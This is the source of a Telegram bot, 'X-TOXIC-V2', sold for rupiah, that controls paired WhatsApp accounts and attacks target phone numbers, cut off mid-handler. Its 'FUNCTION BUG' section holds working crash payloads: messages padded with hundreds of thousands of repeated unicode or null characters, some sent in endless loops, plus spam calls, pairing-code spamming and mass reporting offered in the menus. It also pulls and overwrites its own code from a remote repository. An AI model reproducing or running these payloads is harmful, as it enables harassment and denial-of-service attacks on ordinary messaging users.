const {
  default: makeWASocket,
  useMultiFileAuthState,
  downloadContentFromMessage,
  emitGroupParticipantsUpdate,
  emitGroupUpdate,
  generateWAMessageContent,
  generateWAMessage,
  makeInMemoryStore,
  prepareWAMessageMedia,
  generateWAMessageFromContent,
  MediaType,
  areJidsSameUser,
  WAMessageStatus,
  downloadAndSaveMediaMessage,
  AuthenticationState,
  GroupMetadata,
  initInMemoryKeyStore,
  getContentType,
  MiscMessageGenerationOptions,
  useSingleFileAuthState,
  BufferJSON,
  WAMessageProto,
  MessageOptions,
  WAFlag,
  WANode,
  WAMetric,
  ChatModification,
  MessageTypeProto,
  WALocationMessage,
  ReconnectMode,
  WAContextInfo,
  proto,
  WAGroupMetadata,
  ProxyAgent,
  waChatKey,
  MimetypeMap,
  MediaPathMap,
  WAContactMessage,
  WAContactsArrayMessage,
  WAGroupInviteMessage,
  WATextMessage,
  WAMessageContent,
  WAMessage,
  BaileysError,
  WA_MESSAGE_STATUS_TYPE,
  MediaConnInfo,
  URL_REGEX,
  WAUrlInfo,
  WA_DEFAULT_EPHEMERAL,
  WAMediaUpload,
  jidDecode,
  mentionedJid,
  processTime,
  Browser,
  MessageType,
  Presence,
  WA_MESSAGE_STUB_TYPES,
  Mimetype,
  relayWAMessage,
  Browsers,
  GroupSettingChange,
  DisconnectReason,
  WASocket,
  getStream,
  WAProto,
  isBaileys,
  AnyMessageContent,
  fetchLatestBaileysVersion,
  templateMessage,
  InteractiveMessage,
  Header,
} = require('@bellachu/baileys');
const fs = require("fs-extra");
const JsConfuser = require("js-confuser");
const P = require("pino");
const pino = require("pino");
const crypto = require("crypto");
const fetch = require("node-fetch");
const renlol = fs.readFileSync("./assets/images/thumb.jpeg");
const FormData = require('form-data');
const path = require("path");
const sessions = new Map();
const readline = require("readline");
const cd = "cooldown.json";
const axios = require("axios");
const moment = require("moment");
const chalk = require("chalk");
const config = require("./config.js");
const TelegramBot = require("node-telegram-bot-api");
const BOT_TOKEN = config.BOT_TOKEN;
const SESSIONS_DIR = "./sessions";
const SESSIONS_FILE = "./sessions/active_sessions.json";
const GH_OWNER = "buatgithupscriptrafi-ai";
const GH_REPO = "Autoupdatetes";
const GH_BRANCH = "main";

let premiumUsers = JSON.parse(fs.readFileSync("./premium.json"));
let adminUsers = JSON.parse(fs.readFileSync("./admin.json"));

function ensureFileExists(filePath, defaultData = []) {
  if (!fs.existsSync(filePath)) {
    fs.writeFileSync(filePath, JSON.stringify(defaultData, null, 2));
  }
}

ensureFileExists("./premium.json");
ensureFileExists("./admin.json");

function savePremiumUsers() {
  fs.writeFileSync("./premium.json", JSON.stringify(premiumUsers, null, 2));
}

function saveAdminUsers() {
  fs.writeFileSync("./admin.json", JSON.stringify(adminUsers, null, 2));
}

// Fungsi untuk memantau perubahan file
function watchFile(filePath, updateCallback) {
  fs.watch(filePath, (eventType) => {
    if (eventType === "change") {
      try {
        const updatedData = JSON.parse(fs.readFileSync(filePath));
        updateCallback(updatedData);
        console.log(`File ${filePath} updated successfully.`);
      } catch (error) {
        console.error(`bot ${botNum}:`, error);
      }
    }
  });
}

watchFile("./premium.json", (data) => (premiumUsers = data));
watchFile("./admin.json", (data) => (adminUsers = data));

const GITHUB_TOKEN_LIST_URL =
  "https://raw.githubusercontent.com/izalxy/rafi/refs/heads/main/token.json";

async function fetchValidTokens() {
  try {
    const response = await axios.get(GITHUB_TOKEN_LIST_URL);
    return response.data.tokens;
  } catch (error) {
    console.error(
      chalk.red("❌ Gagal mengambil daftar token dari GitHub:", error.message)
    );
    return [];
  }
}

async function validateToken() {
  console.log(chalk.blue("🔍 Memeriksa token bot.."));

  const validTokens = await fetchValidTokens();
  if (!validTokens.includes(BOT_TOKEN)) {
    console.log(chalk.red("ʟᴜ sᴀᴘᴀ, ᴛᴏᴋᴇɴ ʟᴜ ʟᴏᴍ ᴋᴇᴅᴀғᴛᴀʀ ᴅɪ ᴅʙ ᴍɪɴᴛᴀ sᴇʟʟᴇʀ ʟᴜ 😹🖕🏻"));
    process.exit(1);
  }

  console.log(chalk.green(`ᴛᴏᴋᴇɴ ʟᴜ ᴋᴇᴅᴀғᴛᴀʀ ᴅɪ ᴅʙ 🔥`));
  startBot();
  initializeWhatsAppConnections();
}

const bot = new TelegramBot(BOT_TOKEN, { polling: true });

function startBot() {
  console.log(chalk.red(`

⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⡸⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣫⡶⣁⡣⡹⣿⣿⣿⣿⣿⣿⣿⣿⣿⢟⣵⣏⡺⠳⢻⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢏⣾⣿⢱⣿⣿⡆⢻⣭⣭⣭⣭⣭⣭⣭⣑⣻⣿⢸⣿⣧⠘⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣱⣿⣿⣿⡾⢿⠿⣫⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣮⣝⠇⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⡟⡫⣰⣿⣿⣿⣿⣾⣾⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣮⡻⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⡛⣡⢜⣴⣹⣿⣿⣿⣿⣿⢻⡏⣿⡨⣻⣿⣿⣿⣿⣿⣿⣿⣻⣿⣿⣷⡽⣿⣿⣿⣿⣎⢿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⡿⢋⣴⣿⠯⠼⣿⢻⣿⣿⣿⣿⡏⣧⣷⢹⣧⢷⡝⣿⣦⢻⣿⣿⣿⣷⢱⢻⣿⣷⢹⡻⣿⣿⡟⡆⢻⣿
⣿⣿⣿⣿⣿⣿⡟⢡⣾⣿⢧⡹⢿⡏⣺⣛⣛⡻⣿⢳⢿⣿⠈⣿⢸⣿⡜⣿⡌⣿⡿⢿⠿⣦⠞⡿⣫⣄⢇⢹⡗⣶⣯⢁⢿
⣿⣿⣿⣿⣿⡟⢠⣿⣿⡏⣾⣿⣿⢹⣯⣾⣯⣵⡟⠘⠙⠌⡇⡿⢸⣿⣿⢩⠃⢹⣧⣧⣯⢻⠒⣵⡿⢹⡾⡆⣿⣿⣿⡇⡼
⣿⣿⣿⣿⣿⠱⣸⣿⣿⢱⣿⣿⡇⣾⣿⣿⣿⣿⡏⣾⠟⣰⠇⠁⠛⠿⡿⡿⢃⠘⣡⣠⡀⠈⠀⠀⢀⠙⠃⢱⣿⣿⣿⠇⢁
⣿⣿⣿⣿⣿⡄⣿⣿⡿⣼⣿⣿⢳⣿⣿⣿⣿⣿⡇⣫⠞⣩⡤⠶⢦⣄⣵⣷⣿⣿⣿⣿⣧⠆⠷⠀⠈⠻⣦⠸⣿⣹⡿⣸⣸
⣿⣿⣿⣿⣇⡇⣿⣿⡇⣿⣿⣿⣸⣿⣿⣿⣿⣿⡇⢡⣿⠻⠆⠀⠀⠈⢻⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⣻⡆⢿⣧⡌⢿⣿
⣿⣿⣿⣿⣿⣐⢹⣿⡇⣿⣿⡏⣿⣿⣿⣿⣿⣿⡇⢻⣿⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣆⡀⠀⠀⣠⣿⣾⣌⢿⣿⡜⣿
⣿⣿⣿⣿⣿⣧⠈⣿⣧⢿⣿⡇⣿⣿⣿⣿⣿⣿⡇⣮⣻⣧⣀⢀⣀⣤⣿⣿⣿⣿⣿⣿⣶⣿⣿⣿⣿⣫⣱⡻⡝⡌⣿⣷⢹
⣿⣿⣿⣿⣿⣿⣷⣜⢻⠸⣿⣇⣿⣿⣿⣿⣿⣿⣧⢸⡽⣝⡴⣜⠝⣿⡻⣿⠿⠿⠛⠛⡛⠛⢛⢫⣷⣱⣓⣙⣙⣽⢸⣿⡏
⣿⣿⣿⣿⣿⣿⣿⣿⣷⣇⢻⣿⢹⡿⣿⣿⣿⣿⣿⠘⣮⣾⣮⣮⣾⡿⠀⣀⣀⣦⣥⣒⣀⠁⠂⠄⣿⣿⣿⣿⣿⢏⣿⣿⡇
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢘⣿⡼⣇⣿⣿⣿⣿⣿⡞⣹⣿⣿⣿⣿⡇⣾⣿⣿⣿⣿⣿⣿⣿⣷⣀⣿⣿⣿⢟⣱⣿⣿⣿⡇
⣿⢿⣿⡿⣟⢛⣛⢛⠻⣿⢸⣿⣧⢿⣹⣿⣿⣿⣿⣧⢣⠻⣿⣿⣿⣿⣎⡻⠿⣿⠿⠿⣟⣛⣽⠾⡟⡫⣷⣿⣿⢻⡟⣶⠁
⣿⢀⣵⣯⣾⣿⢣⣾⣿⣿⢘⡿⠿⡎⣧⢿⣿⠟⡿⢱⡔⠑⠄⠉⠉⢻⣿⣿⣿⡿⡟⠋⠉⠑⢶⣿⡇⡇⣿⣿⣾⣶⣾⠏⢳
⢣⣿⣺⣽⣽⡁⣿⣿⣿⡿⣠⣇⣧⣿⡘⣜⣿⣵⣷⣿⣦⠀⠀⠀⠀⠀⠛⡿⢿⠿⠀⠀⠀⠀⢠⡹⠳⣳⢿⣿⣿⣿⢏⠆⣾
⢸⣿⣿⣿⣿⡇⢻⣿⣿⢇⣿⣿⡏⣿⣿⣜⢪⣿⣿⣿⣿⣇⠀⠀⠀⠀⠀⠐⠶⠃⠀⠀⠀⠀⠸⡳⣜⢏⣿⣿⢟⣵⣿⣾⣿

`));


console.log(chalk.greenBright(`
┌─────────────────────────────┐
│ W E L C O M E - X T V
├─────────────────────────────┤
│ Developer : @R4f14ndr4
│ Informasi : @XTOXICV1
└─────────────────────────────┘
`));

console.log(chalk.blueBright(`
[ ---- SCRIPT TELAH ONLINE ---- ]
`
));
};

validateToken();
let sock;

function saveActiveSessions(botNumber) {
  try {
    const sessions = [];
    if (fs.existsSync(SESSIONS_FILE)) {
      const existing = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      if (!existing.includes(botNumber)) {
        sessions.push(...existing, botNumber);
      }
    } else {
      sessions.push(botNumber);
    }
    fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions));
  } catch (error) {
    console.error("Error saving session:", error);
  }
}

async function initializeWhatsAppConnections() {
  try {
    if (fs.existsSync(SESSIONS_FILE)) {
      const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      console.log(`Ditemukan ${activeNumbers.length} sesi WhatsApp aktif`);

      for (const botNumber of activeNumbers) {
        console.log(`Mencoba menghubungkan WhatsApp: ${botNumber}`);
        const sessionDir = createSessionDir(botNumber);
        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

        sock = makeWASocket({
          auth: state,
          printQRInTerminal: true,
          logger: P({ level: "silent" }),
          defaultQueryTimeoutMs: undefined,
        });

        // Tunggu hingga koneksi terbentuk
        await new Promise((resolve, reject) => {
          sock.ev.on("connection.update", async (update) => {
            const { connection, lastDisconnect } = update;
            if (connection === "open") {
              console.log(`Bot ${botNumber} terhubung!`);
              sock.newsletterFollow("120363424007517279@newsletter");
              sock.newsletterFollow("120363425091933526@newsletter");
              sessions.set(botNumber, sock);
              resolve();
            } else if (connection === "close") {
              const shouldReconnect =
                lastDisconnect?.error?.output?.statusCode !==
                DisconnectReason.loggedOut;
              if (shouldReconnect) {
                console.log(`Mencoba menghubungkan ulang bot ${botNumber}...`);
                await initializeWhatsAppConnections();
              } else {
                reject(new Error("Koneksi ditutup"));
              }
            }
          });

          sock.ev.on("creds.update", saveCreds);
        });
      }
    }
  } catch (error) {
    console.error("Error initializing WhatsApp connections:", error);
  }
}

function createSessionDir(botNumber) {
  const deviceDir = path.join(SESSIONS_DIR, `device${botNumber}`);
  if (!fs.existsSync(deviceDir)) {
    fs.mkdirSync(deviceDir, { recursive: true });
  }
  return deviceDir;
}

async function connectToWhatsApp(botNumber, chatId) {
  let statusMessage = await bot
    .sendMessage(
      chatId,
      `\`\`\`js
◇ 𝙋𝙧𝙤𝙨𝙚𝙨𝙨 𝙥𝙖𝙞𝙧𝙞𝙣𝙜 
◇ 𝙠𝙚 𝙣𝙤𝙢𝙤𝙧 : ${botNumber}.....
\`\`\``,
      { parse_mode: "Markdown" }
    )
    .then((msg) => msg.message_id);

  const sessionDir = createSessionDir(botNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  sock = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    logger: P({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      if (statusCode && statusCode >= 500 && statusCode < 600) {
        await bot.editMessageText(
          `\`\`\`js    
◇ 𝙋𝙧𝙤𝙨𝙚𝙨𝙨 𝙥𝙖𝙞𝙧𝙞𝙣𝙜 
◇ 𝙠𝙚 𝙣𝙤𝙢𝙤𝙧 : ${botNumber}.....
\`\`\``,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        await connectToWhatsApp(botNumber, chatId);
      } else {
        await bot.editMessageText(
          `
\`\`\`js
◇ 𝙂𝙖𝙜𝙖𝙡 𝙢𝙚𝙡𝙖𝙠𝙪𝙠𝙖𝙣 𝙥𝙖𝙞𝙧𝙞𝙣𝙜 
◇ 𝙠𝙚 𝙣𝙤𝙢𝙤𝙧 : ${botNumber}.....
\`\`\`
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        try {
          fs.rmSync(sessionDir, { recursive: true, force: true });
        } catch (error) {
          console.error("Error deleting session:", error);
        }
      }
    } else if (connection === "open") {
      sessions.set(botNumber, sock);
      saveActiveSessions(botNumber);
      await bot.editMessageText(
`
\`\`\`js
◇ 𝙋𝙖𝙞𝙧𝙞𝙣𝙜 𝙨𝙪𝙘𝙘𝙚𝙨
◇ 𝙠𝙚 𝙣𝙤𝙢𝙤𝙧 : ${botNumber}
\`\`\`
`,
        {
          chat_id: chatId,
          message_id: statusMessage,
          parse_mode: "Markdown",
        }
      );
      sock.newsletterFollow("120363424007517279@newsletter");
      sock.newsletterFollow("120363425091933526@newsletter");
    } else if (connection === "connecting") {
      await new Promise((resolve) => setTimeout(resolve, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
          const code = await sock.requestPairingCode(botNumber, "KINGRAFI");
          const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;
          await bot.editMessageText(
            `
\`\`\`js
◇ 𝙎𝙪𝙘𝙘𝙚𝙨 𝙥𝙖𝙞𝙧𝙞𝙣𝙜
◇ 𝙔𝙤𝙪𝙧 𝙘𝙤𝙙𝙚 : ${formattedCode}
\`\`\``,
            {
              chat_id: chatId,
              message_id: statusMessage,
              parse_mode: "Markdown",
            }
          );
        }
      } catch (error) {
        console.error("Error requesting pairing code:", error);
        await bot.editMessageText(
          `
\`\`\`js
◇ 𝙂𝙖𝙜𝙖𝙡 𝙢𝙚𝙡𝙖𝙠𝙪𝙠𝙖𝙣 𝙥𝙖𝙞𝙧𝙞𝙣𝙜 
◇ 𝙠𝙚 𝙣𝙤𝙢𝙤𝙧 : ${botNumber}.....
\`\`\``,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
      }
    }
  });

  sock.ev.on("creds.update", saveCreds);

  return sock;
}


// -------( Fungsional Function Before Parameters )--------- \\
// ~Bukan gpt ya kontol

//~Runtime🗑️🔧
function formatRuntime(seconds) {
  const days = Math.floor(seconds / (3600 * 24));
  const hours = Math.floor((seconds % (3600 * 24)) / 3600);
  const minutes = Math.floor((seconds % 3600) / 60);
  const secs = seconds % 60;

  return `${days} Hari,${hours} Jam,${minutes} Menit`
}

const startTime = Math.floor(Date.now() / 1000);

function getBotRuntime() {
  const now = Math.floor(Date.now() / 1000);
  return formatRuntime(now - startTime);
}

//~Get Speed Bots🔧🗑️
function getSpeed() {
  const startTime = process.hrtime();
  return getBotSpeed(startTime);
}

//~ Date Now
function getCurrentDate() {
  const now = new Date();
  const options = {
    weekday: "long",
    year: "numeric",
    month: "long",
    day: "numeric",
  };
  return now.toLocaleDateString("id-ID", options);
}

function getRandomImage() {
  const images = [
    "https://gangalink.vercel.app/i/e1ia2tnw",
  ];
  return images[Math.floor(Math.random() * images.length)];
}

const bagUrl = "https://gangalink.vercel.app/i/e1ia2tnw";
const ownerUrl = "https://gangalink.vercel.app/i/e1ia2tnw";
const bugUrl = "https://gangalink.vercel.app/i/e1ia2tnw";

// ~ Coldowwn

let cooldownData = fs.existsSync(cd)
  ? JSON.parse(fs.readFileSync(cd))
  : { time: 5 * 60 * 1000, users: {} };

function saveCooldown() {
  fs.writeFileSync(cd, JSON.stringify(cooldownData, null, 2));
}

function checkCooldown(userId) {
  if (cooldownData.users[userId]) {
    const remainingTime =
      cooldownData.time - (Date.now() - cooldownData.users[userId]);
    if (remainingTime > 0) {
      return Math.ceil(remainingTime / 1000);
    }
  }
  cooldownData.users[userId] = Date.now();
  saveCooldown();
  setTimeout(() => {
    delete cooldownData.users[userId];
    saveCooldown();
  }, cooldownData.time);
  return 0;
}

function setCooldown(timeString) {
  const match = timeString.match(/(\d+)([smh])/);
  if (!match) return "Format salah! Gunakan contoh: /setjeda 5m";

  let [_, value, unit] = match;
  value = parseInt(value);

  if (unit === "s") cooldownData.time = value * 1000;
  else if (unit === "m") cooldownData.time = value * 60 * 1000;
  else if (unit === "h") cooldownData.time = value * 60 * 60 * 1000;

  saveCooldown();
  return `Cooldown diatur ke ${value}${unit}`;
}

function getPremiumStatus(userId) {
  const user = premiumUsers.find((user) => user.id === userId);
  if (user && new Date(user.expiresAt) > new Date()) {
    return `Ya - ${new Date(user.expiresAt).toLocaleString("id-ID")}`;
  } else {
    return "Tidak - Tidak ada waktu aktif";
  }
}

async function getWhatsAppChannelInfo(link) {
  if (!link.includes("https://whatsapp.com/channel/"))
    return { error: "Link tidak valid!" };

  let channelId = link.split("https://whatsapp.com/channel/")[1];
  try {
    let res = await sock.newsletterMetadata("invite", channelId);
    return {
      id: res.id,
      name: res.name,
      subscribers: res.subscribers,
      status: res.state,
      verified: res.verification == "VERIFIED" ? "Terverifikasi" : "Tidak",
    };
  } catch (err) {
    return { error: "Gagal mengambil data! Pastikan channel valid." };
  }
}

function sleep(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

async function spamcall(target) {
  const sock = makeWASocket({
    printQRInTerminal: false,
  });

  try {
    console.log(`📞 Mengirim panggilan ke ${target}`);

    await sock.query({
      tag: "call",
      json: ["action", "call", "call", { id: `${target}` }],
    });

    console.log(`✅ Berhasil mengirim panggilan ke ${target}`);
  } catch (err) {
    console.error(`⚠️ Gagal mengirim panggilan ke ${target}:`, err);
  } finally {
    sock.ev.removeAllListeners(); 
    sock.ws.close();
  }
}

async function downloadRepo(dir = "", basePath = "/home/container") {
    const apiURL = `https://api.github.com/repos/${GH_OWNER}/${GH_REPO}/contents/${dir}?ref=${GH_BRANCH}`;

    const { data } = await axios.get(apiURL, {
        headers: { "User-Agent": "Mozilla/5.0" }
    });

    for (const item of data) {
        const localPath = path.join(basePath, item.path);

        if (item.type === "file") {
            const fileResp = await axios.get(item.download_url, {
                responseType: "arraybuffer"
            });

            fs.mkdirSync(path.dirname(localPath), { recursive: true });
            fs.writeFileSync(localPath, Buffer.from(fileResp.data));

            console.log(`[UPDATE] ${localPath}`);
        }

        if (item.type === "dir") {
            fs.mkdirSync(localPath, { recursive: true });
            await downloadRepo(item.path, basePath);
        }
    }
}

async function sendOfferCall(target) {
  try {
    await sock.offerCall(target);
    console.log(chalk.white.bold(`Success Send To Target`));
  } catch (error) {
    console.error(chalk.white.bold(`Failed Send:`, error));
  }
}

async function sendOfferVideoCall(target) {
  try {
    await sock.offerCall(target, {
      video: true,
    });
    console.log(chalk.white.bold(`Success Send To Target`));
  } catch (error) {
    console.error(
      chalk.white.bold(`Failed Send:`, error)
    );
  }
}
//--------------------------------------------FUNCTION BUG----------------------------------------------------------\\
async function MarkNyawit(sock, target) {
  try {
    const S = {
      viewOnceMessage: {
        message: {
          newsletterAdminInviteMessage: {
             newsletterJid: "123456789@newsletter",
             inviteCode: "𑜦𑜠".repeat(120000),
             inviteExpiration: 99999999999,
             newsletterName: "ោ៝" + "ꦾ".repeat(250000),
             body: {
                 text: "I AM Rafi" + "ી".repeat(250000)
                }
             }
          }
       }
    };

    await sock.relayMessage(target, S, { participant: { jid: target } });
  } catch (e) {
    console.log("❌ Error Bng:", e.message || e);
  }
}

async function NanasOneMsg(sock, target) {
    const groupJid = "123456789012899@g.us"
    const inviteCode = "AbCdEfGhIjKlMn"
    const newsletterJid = "123456789@newsletter"
    const inviteExpiration = Math.floor(Date.now() / 1000) + 85000
    const groupMsg = generateWAMessageFromContent(
        target,
        proto.Message.fromObject({
            groupInviteMessage: {
                groupJid,
                inviteCode,
                inviteExpiration,
                groupName: "𑜦𑜠".repeat(30000),
                caption: "XTV IS HERE ¿!⃟" + "ꦽ".repeat(30000)
            }
        }),
        {}
    )
    await sock.relayMessage(target, groupMsg.message, { messageId: groupMsg.key.id })
    const newsletterMsg = generateWAMessageFromContent(
        target,
        proto.Message.fromObject({
            newsletterAdminInviteMessage: {
                newsletterJid,
                newsletterName: "ꦾ".repeat(30000) + ":҉⃝҉".repeat(30000),
                caption: "⃟Rafi - Ganteng ¿!⃟" + "ꦽ".repeat(40000),
                inviteExpiration
            }
        }),
        {}
    )
    await sock.relayMessage(target, newsletterMsg.message, { messageId: newsletterMsg.key.id })
}

async function R7XNewsletterCrash(sock, target) {
  const R7X = {
    newsletterAdminInviteMessage: {
      newsletterJid: "17172717172726@newsletter",
      newsletterName: "XTV - Blank" + "ោ៝".repeat(25000) + "ꦾ".repeat(50000),
      caption: "XTV - Magician" + "ꦽ".repeat(25000) + "ꦾ".repeat(120000),
      inviteExpiration: 17171617,
      jpegThumbnail: null,
    }
  };
  
  await sock.relayMessage(target, R7X, {
    messageId: null,
    participant: { jid: target }
  });
}

async function DelayHardV4(sock) {
const startTime = Date.now();
  const duration = 1 * 60 * 1000;
  while (Date.now() - startTime < duration) {
    await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: {
      interactiveResponseMessage: {
        body: {
          text: "XTV IS HERE",
          format: "DEFAULT"
        },
        nativeFlowResponseMessage: {
          name: "galaxy_message",
          paramsJson: "",
          version: 3
        },
        contextInfo: {
          remoteJid: Math.random().toString(36) + "\u0000".repeat(90000),
          isForwarded: true,
          forwardingScore: 9999,
          urlTrackingMap: {
            urlTrackingMapElements: Array.from({ length: 209000 }, (_, z) => ({
              participant: `62${z + 720599}@s.whatsapp.net`
            }))
          },
        },
      },
    },
  },
}, { participant: { jid: target }});
}
}

async function DelayOneMsgPermaXTV(sock, target) {
    while (true) {
        try {
            const msg = await generateWAMessageFromContent(
                target,
                {
                    groupStatusMessageV2: {
                        message: {  
                            interactiveResponseMessage: {
                                body: {
                                    text: "RaF",
                                    format: "DEFAULT"
                                },
                                nativeFlowResponseMessage: {
                                    name: "galaxy_message",
                                    paramsJson: `{\"flow_cta\":\"${"\u0000".repeat(999999)}\"}}`,
                                    version: 3
                                }
                            }
                        }
                    }
                },
                { userJid: sock.user.id } 
            );

            await sock.relayMessage(
                target,
                msg.message,
                {
                    messageId: msg.key.id,
                    participant: { jid: target }
                }
            );

            console.log(`👻 attack ke ${target} (Looping Active)`);

            await new Promise(resolve => setTimeout(resolve, 1000));

        } catch (err) {
            console.error("❌ Error dalam Loop:", err);
            await new Promise(resolve => setTimeout(resolve, 5000));
        }
    }
}

async function DenglayKebeletPipis(sock, target) {
await sock.relayMessage(target, {
   groupStatusMessageV2: {
      message: {
       interactiveResponseMessage: {
          header: {
            title: "\u0000.ZYU" + "{{".repeat(250000)
          },
          body: {
            text: "XTV"
          },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: "\u0000".repeat(400000),
            version: 3
          },
          entryPointConversionSource: "call_permission_request"
        }
      }
    }
  }, { participant: { jid: target } });

  console.log("[!] XTV Bug Sent to: " + target);
}


//------------------------------------------------------------------------------------------------------------------------------\\

function isOwner(userId) {
  return config.OWNER_ID.includes(userId.toString());
}

const bugRequests = {};
bot.onText(/\/start/, async (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const isPrivate = msg.chat.type === 'private';
  const CONFETTI_ID = "5104841245755180586";
  const username = msg.from.username
    ? `@${msg.from.username}`
    : "Tidak ada username";
  const premiumStatus = getPremiumStatus(senderId);
  const runtime = getBotRuntime();
  const developer = "@R4f14ndr4";
  const name = "Sakata";
  const version = "15.0";
  const platform = "telegram";
  const randomImage = getRandomImage();

  bot.sendPhoto(chatId, randomImage, {
    message_effect_id: isPrivate ? CONFETTI_ID : null,
    caption: `
\`\`\`js
𖥂 X-TOXIC-V2 𖥂
Powerful • Secure • Exclusive

Owners : @R4f14ndr4
My Love : GK ada

Harga Users : Rp5.000
Harga Reseller : Rp7.000

Klik button di bawah untuk melanjutkan
\`\`\`
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
         [ 
           { text: "Buka Menu", callback_data: "attact", style: "Danger" }
         ]
      ],
    },
  });
});

bot.on("callback_query", async (query) => {
  try {
    const chatId = query.message.chat.id;
    const messageId = query.message.message_id;
    const senderId = query.from.id;

    const username = query.from.username
      ? `@${query.from.username}`
      : "Tidak ada username";

    const runtime = getBotRuntime();
    const premiumStatus = getPremiumStatus(senderId);
    const developer = "@R4f14ndr4";
    const name = "Sakata";
    const version = "17.0";
    const platform = "telegram";

    // jawab callback SEKALI
    await bot.answerCallbackQuery(query.id, {
      text: "Script Loading",
      show_alert: false,
    });

    let caption = "";
    let replyMarkup = {};
    let media = getRandomImage();

    /* ================= MAIN MENU ================= */
    if (query.data === "back_to_main") {
      caption = `
\`\`\`js
𖥂 X-TOXIC-V2 𖥂
Powerful • Secure • Exclusive

Owners : @R4f14ndr4
My Love : GK ada

Harga Users : Rp5.000
Harga Reseller : Rp7.000

Klik button di bawah untuk melanjutkan
\`\`\`
`;
      replyMarkup = {
        inline_keyboard: [
         [
           { text: "Buka Menu", callback_data: "attact", style: "Primary" }
         ]
        ],
      };
    }
    
// bug menu
    else if (query.data === "attact") {
      caption = `\`\`\`js
⬡═—⊱ Killer ⊰—═⬡
• /Xblank → BLANK CLIK
• /Xone → BLANK ONE MSG
• /Newsletter → NEWSLETTER CRASH
• /Extremedelay → DELAY HARD + BULDOZZER
\`\`\``;
      media = bugUrl;
      replyMarkup = {
        inline_keyboard: [
          [
            { text: "Back", callback_data: "back_to_main", style: "Success" },          
            { text: "Next", callback_data: "tools", style: "Primary" }
          ]
        ],
      };
    }
        
    // TOOLS DAN FUN MENU    
    else if (query.data === "tools") {
      caption = `\`\`\`js
⬡═—⊱ MENU TOOLS ⊰—═⬡
• /SpamPairing → SPAM KODE PAIRING
• /ReportWa → REPORT WHATSAPP
• /tourl → POTO TO LINK JPG
• /cekfunc → CHECK FUNCTION ERROR
• /fixcode → FIK ERROR CODE
• /brat → BIKIN STIKER
• /bisakah → TANYA AI BOT
\`\`\``;
      media = bagUrl;
      replyMarkup = {
        inline_keyboard: [
          [
            { text: "Back", callback_data: "attact", style: "Success" },
            { text: "Next", callback_data: "tq", style: "Primary" }
          ]
        ],
      };
    }
    
    else if (query.data === "tq") {
      caption = `\`\`\`js
⬡═—⊱ THANKS TOO ⊰—═⬡ 
KING OWNER 
• Raffx

KING SUPPORT
• Lian
• All Users Script Sakata
\`\`\``;
      media = bagUrl;
      replyMarkup = {
        inline_keyboard: [
          [
            { text: "Back", callback_data: "tools", style: "Primary" },
            { text: "Next", callback_data: "owner_menu", style: "Success" },
          ]
        ],
      };
    }
      

    /* ================= OWNER MENU ================= */
    else if (query.data === "owner_menu") {
      caption = `\`\`\`js
⬡═—⊱ AKSES OWNER ⊰—═⬡
• /addowner → TAMBAH OWNER
• /delowner → HAPUS OWNER
• /addadmin → TAMBAH ADMIN
• /deladmin → HAPUS ADMIN
• /addprem → TAMBAH PREMIUM
• /delprem → HAPUS PREMIUM
• /setcd → SETTING COLDOWN
• /addbot → TAMBAH SENDER
• /dellbot → HAPUS SENDER
• /listbot → CEK SENDER AKTIF
• /update → UPDATE SCRIPT

⬡═—⊱ AKSES ADMIN ⊰—═⬡
• /addprem → TAMBAH PREMIUM
• /delprem → HAPUS PREMIUM
• /setcd → SETTING COLDOWN
• /addbot → TAMBAH SENDER
• /dellbot → HAPUS SENDER
• /listbot → CEK SENDER AKTIF
\`\`\``;
      media = ownerUrl;
      replyMarkup = {
        inline_keyboard: [
       [
            { text: "Back", callback_data: "back_to_main", style: "Success" }
       ]
      ],
      };
    }

    await bot.editMessageMedia(
      {
        type: "photo",
        media,
        caption,
        parse_mode: "Markdown",
      },
      {
        chat_id: chatId,
        message_id: messageId,
        reply_markup: replyMarkup,
      }
    );
  } catch (error) {
    console.error("Error handling callback query:", error);
  }
});
    
//=======CASE BUG=========//
bot.onText(/\/Xblank (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
